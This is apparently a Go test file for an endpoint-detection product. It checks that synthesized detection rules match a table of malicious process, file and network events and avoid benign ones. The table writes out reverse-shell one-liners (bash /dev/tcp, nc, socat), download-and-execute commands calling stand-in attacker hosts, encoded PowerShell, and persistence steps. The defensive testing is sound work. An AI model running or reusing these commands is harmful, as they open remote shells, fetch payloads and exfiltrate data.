// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

var synthSources = []LabEvent{
	{Kind: "process", Executable: "/bin/bash", ParentExe: "/usr/bin/python3", Command: "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"},
	{Kind: "process", Executable: "/usr/bin/curl", Command: "curl -s http://198.51.100.20/payload.sh -o /tmp/.x11 --insecure"},
	{Kind: "process", Executable: "/usr/bin/wget", Command: "wget -q -O- http://evil.example.net/a | sh"},
	{Kind: "process", Executable: "/usr/bin/nc", Command: "nc -e /bin/sh 203.0.113.5 9001"},
	{Kind: "process", Executable: "/usr/bin/python3", Command: "python3 -c import socket,subprocess,os;s=socket.socket();s.connect(('203.0.113.7',5555))"},
	{Kind: "process", Executable: "/usr/bin/perl", Command: "perl -e use Socket;$i=\"203.0.113.8\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))"},
	{Kind: "process", Executable: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", Command: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"},
	{Kind: "process", Executable: "C:\\Windows\\System32\\certutil.exe", Command: "certutil.exe -urlcache -split -f http://203.0.113.4/m.exe C:\\Users\\Public\\m.exe"},
	{Kind: "process", Executable: "C:\\Windows\\System32\\rundll32.exe", Command: "rundll32.exe C:\\Users\\Public\\evil.dll,DllRegisterServer"},
	{Kind: "process", Executable: "C:\\Windows\\System32\\mshta.exe", Command: "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run\")"},
	{Kind: "process", Executable: "C:\\Windows\\System32\\regsvr32.exe", Command: "regsvr32 /s /n /u /i:http://203.0.113.3/x.sct scrobj.dll"},
	{Kind: "process", Executable: "C:\\Windows\\System32\\bitsadmin.exe", Command: "bitsadmin /transfer job /download /priority high http://203.0.113.2/a.exe C:\\Temp\\a.exe"},
	{Kind: "process", Executable: "/usr/bin/chmod", Command: "chmod +x /tmp/.hidden/implant"},
	{Kind: "process", Executable: "/usr/bin/base64", Command: "base64 -d /tmp/.cache/blob.b64"},
	{Kind: "process", Executable: "/usr/bin/openssl", Command: "openssl enc -aes-256-cbc -salt -pbkdf2 -in /home/u/secrets.tar -out /tmp/.s.enc"},
	{Kind: "process", Executable: "/usr/bin/socat", Command: "socat TCP4:203.0.113.6:8443 EXEC:/bin/bash,pty,stderr"},
	{Kind: "process", Executable: "/usr/bin/ssh", Command: "ssh -N -R 2222:127.0.0.1:22 tunnel@203.0.113.1"},
	{Kind: "process", Executable: "/usr/bin/crontab", Command: "crontab /tmp/.cronx"},
	{Kind: "process", Executable: "/usr/bin/osascript", Command: "osascript -e do shell script \"curl http://203.0.113.11/p | sh\" with administrator privileges"},
	{Kind: "process", Executable: "/usr/bin/dscl", Command: "dscl . -create /Users/support IsHidden 1"},
	{Kind: "file", Path: "/tmp/.hidden/implant", Operation: "create"},
	{Kind: "file", Path: "/etc/cron.d/zzbackdoor", Operation: "create"},
	{Kind: "file", Path: "/home/dev/.ssh/authorized_keys2", Operation: "modify"},
	{Kind: "file", Path: "C:\\Users\\Public\\Documents\\invoice.docm.exe", Operation: "create"},
	{Kind: "file", Path: "/Library/LaunchDaemons/com.apple.updater.helper.plist", Operation: "create"},
	{Kind: "network", Destination: "c2-gateway.evil-example.net:8443"},
	{Kind: "network", Destination: "203.0.113.77:4444"},
	{Kind: "network", Destination: "pastebin-mirror.badcdn.example.org:443"},
}

func TestSynthesizeManySources(t *testing.T) {
	benign, _ := synthBenignSet()
	if len(benign) < 1500 {
		t.Fatalf("benign set too small: %d", len(benign))
	}
	ok, refused := 0, 0
	type built struct {
		src  LabEvent
		rule ContentRule
	}
	var rules []built
	for i, src := range synthSources {
		out, code := synthesizeRule(src, "high", "", "")
		if code != http.StatusOK {
			refused++
			t.Logf("#%d refused (%s): %v", i, synthBaseLabel(src), out["error"])
			continue
		}
		raw, _ := json.Marshal(out["rule"])
		var rule ContentRule
		if err := json.Unmarshal(raw, &rule); err != nil {
			t.Fatal(err)
		}
		// the same validation the custom-content store applies
		cp := rule
		if err := validateCustomRule(&cp); err != nil {
			t.Fatalf("#%d %s: synthesized rule fails the harness: %v", i, rule.ID, err)
		}
		if rule.Severity == "high" || rule.Severity == "critical" {
			t.Fatalf("#%d severity must be capped at medium, got %s", i, rule.Severity)
		}
		if n := len(rule.Match.All); n < 2 || n > 4 {
			t.Fatalf("#%d conjunction size %d outside 2..4", i, n)
		}
		hasTag := false
		for _, tg := range rule.Tags {
			hasTag = hasTag || tg == "synthesized"
		}
		if !hasTag {
			t.Fatalf("#%d missing synthesized tag", i)
		}
		rule = cp
		s := src
		s.Kind = rule.EventType
		if !rule.Matches(s) {
			t.Fatalf("#%d rule does not match its source event", i)
		}
		for j, ev := range benign {
			for _, kind := range []string{rule.EventType, "process", "file", "network"} {
				e := ev
				e.Kind = kind
				if rule.Matches(e) {
					t.Fatalf("#%d rule %s matches benign event #%d (%s)", i, rule.ID, j, customBaselineLabel(ev))
				}
			}
		}
		if out["saved"] != false || out["enabled"] != false || out["recommended_initial_lifecycle"] != "testing" {
			t.Fatalf("#%d response must state nothing was saved/enabled and recommend testing", i)
		}
		t.Logf("#%d %s", i, rule.Name)
		ok++
		rules = append(rules, built{src, rule})
	}
	t.Logf("synthesized %d/%d rules, %d refused as too generic; each validated, matched its source and 0/%d benign events", ok, len(synthSources), refused, len(benign))
	if ok < 25 {
		t.Fatalf("expected at least 25 synthesized rules, got %d", ok)
	}
	// intended-only: a rule must not fire on unrelated sources (different kind or different content).
	cross := 0
	for i, a := range rules {
		for j, b := range rules {
			if i == j || a.src.Kind != b.src.Kind {
				continue
			}
			e := b.src
			e.Kind = a.rule.EventType
			if a.rule.Matches(e) {
				cross++
				t.Logf("rule %s (%s) also matches the other source %s", a.rule.ID, a.rule.Name, synthBaseLabel(b.src))
			}
		}
	}
	if cross > 2 {
		t.Fatalf("%d cross-matches between unrelated sources: rules are too broad", cross)
	}
}

func synthBaseLabel(e LabEvent) string { return customBaselineLabel(e) }

func TestSynthesizeRefusesGeneric(t *testing.T) {
	out, code := synthesizeRule(LabEvent{Kind: "process", Executable: "/bin/ls", Command: "ls -la /home/dev"}, "", "", "")
	if code != http.StatusUnprocessableEntity || out["error"] == nil {
		t.Fatalf("a benign event must not synthesize a rule: %d %v", code, out["error"])
	}
}

func TestSynthesizeEndpointReadOnly(t *testing.T) {
	store, err := NewStore(filepath.Join(t.TempDir(), "f.jsonl"), 100)
	if err != nil {
		t.Fatal(err)
	}
	mux := http.NewServeMux()
	RegisterCustomContent(mux, "tok", store)
	RegisterMLNet(mux, "tok", store)
	f := Finding{ID: "f1", Time: time.Now(), Host: "h1", Rule: "download-execute", Severity: "high",
		Evidence: Event{Host: "h1", Executable: "/usr/bin/curl", Command: "curl -s http://198.51.100.20/payload.sh -o /tmp/.x11 --insecure"}}
	if err := store.Append(f); err != nil {
		t.Fatal(err)
	}
	do := func(method, path, body, tok string) *httptest.ResponseRecorder {
		req := httptest.NewRequest(method, path, bytes.NewBufferString(body))
		if tok != "" {
			req.Header.Set("Authorization", "Bearer "+tok)
		}
		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)
		return w
	}
	if w := do("POST", "/v1/ml/synthesize", `{"finding_id":"f1"}`, ""); w.Code != 401 && w.Code != 403 {
		t.Fatalf("synthesize must require auth, got %d", w.Code)
	}
	for _, p := range []string{"/v1/ml/beacons", "/v1/ml/priority"} {
		if w := do("GET", p, "", ""); w.Code != 401 && w.Code != 403 {
			t.Fatalf("%s must require auth, got %d", p, w.Code)
		}
	}
	w := do("POST", "/v1/ml/synthesize", `{"finding_id":"f1"}`, "tok")
	if w.Code != 200 {
		t.Fatalf("synthesize: %d %s", w.Code, w.Body.String())
	}
	var resp struct {
		Rule       ContentRule    `json:"rule"`
		Validation map[string]any `json:"validation"`
		Saved      bool           `json:"saved"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if !resp.Validation["valid"].(bool) || resp.Saved {
		t.Fatalf("bad verdict: %s", w.Body.String())
	}
	if resp.Rule.Tactic != "Execution" || resp.Rule.Severity != "medium" {
		t.Fatalf("tactic/severity not derived from the finding rule: %+v", resp.Rule)
	}
	// nothing saved: custom list empty; no custom file written
	if l := do("GET", "/v1/content/custom", "", "tok"); !strings.Contains(l.Body.String(), `"count":0`) {
		t.Fatalf("synthesize must not save anything: %s", l.Body.String())
	}
	// the analyst can save the returned JSON through the normal path
	rb, _ := json.Marshal(resp.Rule)
	if s := do("POST", "/v1/content/custom", string(rb), "tok"); s.Code != 200 {
		t.Fatalf("the synthesized rule must be saveable via POST /v1/content/custom: %d %s", s.Code, s.Body.String())
	}
	// input validation
	if w := do("POST", "/v1/ml/synthesize", `{"command":"x","finding_id":"f1"}`, "tok"); w.Code != 400 {
		t.Fatalf("exactly one input required: %d", w.Code)
	}
	if w := do("POST", "/v1/ml/synthesize", `{"finding_id":"nope"}`, "tok"); w.Code != 404 {
		t.Fatalf("unknown finding: %d", w.Code)
	}
	if w := do("POST", "/v1/ml/synthesize", `{"command":"nc -e /bin/sh 203.0.113.5 9001"}`, "tok"); w.Code != 200 {
		t.Fatalf("command input: %d %s", w.Code, w.Body.String())
	}
}

func TestPriorityAndBeaconEndpoints(t *testing.T) {
	store, err := NewStore(filepath.Join(t.TempDir(), "f.jsonl"), 1000)
	if err != nil {
		t.Fatal(err)
	}
	mux := http.NewServeMux()
	RegisterMLNet(mux, "tok", store)
	t0 := time.Date(2026, 3, 1, 8, 0, 0, 0, time.UTC)
	for i := 0; i < 30; i++ {
		if _, err := store.IngestNetwork(NetworkEvent{Time: t0.Add(time.Duration(i) * 60 * time.Second), Host: "h1", PID: 7, Destination: "198.51.100.7:443"}); err != nil {
			t.Fatal(err)
		}
		_, _ = store.IngestNetwork(NetworkEvent{Time: t0.Add(time.Duration(i) * 60 * time.Second), Host: "h1", PID: 8, Destination: "pool.ntp.org:123"})
	}
	_ = store.Append(Finding{ID: "f9", Time: t0, Host: "h1", Rule: "shell-network-redirection", Severity: "high", Destination: "198.51.100.7:443"})
	get := func(p string) map[string]any {
		req := httptest.NewRequest("GET", p, nil)
		req.Header.Set("Authorization", "Bearer tok")
		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)
		if w.Code != 200 {
			t.Fatalf("%s: %d %s", p, w.Code, w.Body.String())
		}
		var m map[string]any
		_ = json.Unmarshal(w.Body.Bytes(), &m)
		return m
	}
	b := get("/v1/ml/beacons")
	sus := b["suspects"].([]any)
	if len(sus) != 1 || b["excluded_benign_periodic"].(float64) != 1 {
		t.Fatalf("want 1 suspect and the NTP series excluded: %v", b)
	}
	p := get("/v1/ml/priority?finding_id=f9")["priority"].(map[string]any)
	names := map[string]bool{}
	for _, f := range p["factors"].([]any) {
		names[f.(map[string]any)["name"].(string)] = true
	}
	if !names["beaconing"] || !names["severity"] || names["rarity"] || names["asset_criticality"] {
		t.Fatalf("unexpected factor set (rarity and asset must be omitted): %v", names)
	}
	MLRarityProvider = func(host, exe, parent string) (float64, bool) { return 1, true }
	defer func() { MLRarityProvider = nil }()
	p2 := get("/v1/ml/priority?host=h1")["priorities"].([]any)[0].(map[string]any)
	if p2["score"].(float64) <= p["score"].(float64)-0.001 {
		t.Fatalf("a rarity of 1 must not lower the score: %v vs %v", p2["score"], p["score"])
	}
}
